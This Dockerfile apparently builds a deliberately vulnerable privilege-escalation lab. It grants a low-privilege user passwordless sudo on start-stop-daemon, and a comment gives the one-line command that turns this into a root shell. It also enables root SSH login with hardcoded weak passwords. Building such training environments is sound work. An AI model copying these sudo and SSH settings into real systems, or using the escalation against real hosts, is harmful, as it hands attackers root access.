FROM debian:bookworm-slim

# ============================================================
# PrivEscalate Scenario: sudo_start-stop-daemon
# ATT&CK: T1548.003 | CWE: CWE-269
# Vulnerability: sudo misconfiguration allows running /usr/bin/start-stop-daemon as root
# ============================================================

ENV DEBIAN_FRONTEND=noninteractive

# Install SSH server and sudo
# start-stop-daemon is part of dpkg, which is already installed in debian base images
RUN apt-get update && \
    apt-get install -y \
        openssh-server \
        sudo \
    && rm -rf /var/lib/apt/lists/* \
    && mkdir -p /run/sshd

# Verify start-stop-daemon is installed
RUN which start-stop-daemon && ls -la /usr/sbin/start-stop-daemon

# Create low-privilege user
RUN useradd -m -s /bin/bash lowpriv && \
    echo "lowpriv:password123" | chpasswd

# --- Configure sudo vulnerability ---
# start-stop-daemon can start arbitrary commands as any user.
# Exploit: sudo start-stop-daemon -n anything -S -x /bin/sh -- -p
# This starts /bin/sh as root, giving a root shell.
RUN echo "lowpriv ALL=(root) NOPASSWD: /usr/sbin/start-stop-daemon" > /etc/sudoers.d/start-stop-daemon && \
    chmod 440 /etc/sudoers.d/start-stop-daemon

# Verify sudo configuration
RUN visudo -c

# Keep SUID on sudo
RUN chmod u+s /usr/bin/sudo

# Configure SSH
RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    echo "root:aim8Du7h" | chpasswd

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]